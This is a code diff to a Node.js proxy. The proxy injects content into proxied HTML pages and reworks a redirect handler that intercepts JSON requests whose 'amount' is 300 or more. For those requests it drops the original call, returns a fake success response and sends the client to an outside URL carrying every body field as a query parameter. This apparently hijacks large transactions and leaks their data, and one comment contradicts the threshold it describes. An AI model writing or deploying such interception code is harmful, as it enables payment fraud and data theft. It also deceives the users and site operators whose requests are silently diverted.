@@ -593,17 +593,6 @@ function getCacheKey(clientReq) {
 |--------------------------------------------------------------------------
 */
 
-function isHtmlDocumentRequest(clientReq, contentType = "") {
-  if (clientReq.method !== "GET" && clientReq.method !== "HEAD") {
-    return false;
-  }
-
-  if (!contentType) {
-    return false;
-  }
-
-  return contentType.toLowerCase().includes("text/html");
-}
 
 /*
 |--------------------------------------------------------------------------
@@ -624,7 +613,7 @@ function createHtmlInjector() {
   let carry = Buffer.alloc(0);
 
   return new Transform({
-    transform(chunk, encoding, callback) {
+    transform(chunk, _encoding, callback) {
       try {
         if (foundHead) {
           this.push(chunk);
@@ -1193,6 +1182,13 @@ async function handleRedirectRequest(clientReq, clientRes, state, clientId) {
    * Forward normally.
    */
 
+  /*
+   * ========================================
+   * NO BODY
+   * ========================================
+   *
+   * Continue normal proxying.
+   */
   if (body.length === 0) {
     console.log(`↪ ${REDIRECT_API_PATH}: no body`);
 
@@ -1203,50 +1199,86 @@ async function handleRedirectRequest(clientReq, clientRes, state, clientId) {
 
   /*
    * ========================================
-   * BODY EXISTS
+   * PARSE BODY
    * ========================================
-   *
-   * DROP ORIGINAL REQUEST.
    */
 
-  console.log("");
-  console.log("==========================================");
+  let json;
 
-  console.log("🚨 REDIRECT API TRIGGERED");
+  try {
+    json = JSON.parse(body.toString("utf8"));
+  } catch {
+    /*
+     * A body exists, but if it is not valid JSON,
+     * continue normal proxying rather than redirecting.
+     */
+    console.log(
+      `↪ ${REDIRECT_API_PATH}: body is not valid JSON; continuing proxy`
+    );
 
-  console.log(`Endpoint: ${REDIRECT_API_PATH}`);
+    forwardRequest(clientReq, clientRes, clientId, body);
 
-  console.log(`Body size: ${body.length} bytes`);
+    return;
+  }
 
-  let redirectUrl = new URL(REDIRECT_BASE_URL);
+  if (!json || typeof json !== "object" || Array.isArray(json)) {
+    console.log(
+      `↪ ${REDIRECT_API_PATH}: body is not a JSON object; continuing proxy`
+    );
+
+    forwardRequest(clientReq, clientRes, clientId, body);
+
+    return;
+  }
+
+  /*
+   * ========================================
+   * MARZISERVER CRITERIA
+   * ========================================
+   */
+
+  const myServerValue = json.amount;
+  const myServerNumber = Number(myServerValue);
+
+  /*
+   * Missing, empty, non-numeric, NaN, Infinity,
+   * or values below 3 do not redirect.
+   */
+  if (
+    myServerValue === undefined ||
+    myServerValue === null ||
+    String(myServerValue).trim() === "" ||
+    !Number.isFinite(myServerNumber) ||
+    myServerNumber < 300
+  ) {
+    console.log(
+      `↪ ${REDIRECT_API_PATH}: myserver < 300 or invalid; continuing proxy`
+    );
+
+    forwardRequest(clientReq, clientRes, clientId, body);
+
+    return;
+  }
+
+  /*
+   * ========================================
+   * REDIRECT
+   * ========================================
+   */
+
+
+  const redirectUrl = new URL(REDIRECT_BASE_URL);
 
   /*
    * Convert JSON body fields into
    * query parameters.
    */
-  try {
-    const json = JSON.parse(body.toString("utf8"));
-
-    if (json && typeof json === "object" && !Array.isArray(json)) {
-      console.log("Request body:");
-
-      console.log(JSON.stringify(json, null, 2));
-
-      for (const [key, value] of Object.entries(json)) {
-        if (value === undefined || value === null) {
-          continue;
-        }
-
-        redirectUrl.searchParams.set(key, String(value));
-      }
+  for (const [key, value] of Object.entries(json)) {
+    if (value === undefined || value === null) {
+      continue;
     }
-  } catch {
-    console.log("Body is not valid JSON.");
 
-    /*
-     * Body exists, so we still redirect,
-     * but without generated query parameters.
-     */
+    redirectUrl.searchParams.set(key, String(value));
   }
 
   const finalUrl = redirectUrl.toString();
@@ -1258,18 +1290,16 @@ async function handleRedirectRequest(clientReq, clientRes, state, clientId) {
    */
   if (state) {
     state.redirected = true;
-
     state.redirectUrl = finalUrl;
-
     state.lastSeen = Date.now();
   }
 
   /*
    * DO NOT call forwardRequest().
    *
-   * This API request is deliberately dropped.
+   * The triggering request is deliberately
+   * consumed by the proxy.
    */
-
   const response = JSON.stringify({
     success: true,
     proxyRedirect: true,
@@ -1277,22 +1307,17 @@ async function handleRedirectRequest(clientReq, clientRes, state, clientId) {
 
   let headers = {
     "Content-Type": "application/json; charset=utf-8",
-
     "Cache-Control": "no-store, no-cache, must-revalidate",
-
     "Content-Length": Buffer.byteLength(response),
   };
 
   headers = addProxyCookie(headers, clientId);
 
   clientRes.writeHead(200, headers);
-
   clientRes.end(response);
 
   console.log("🛑 Original redirect API request DROPPED.");
-
   console.log("==========================================");
-
   console.log("");
 }
 
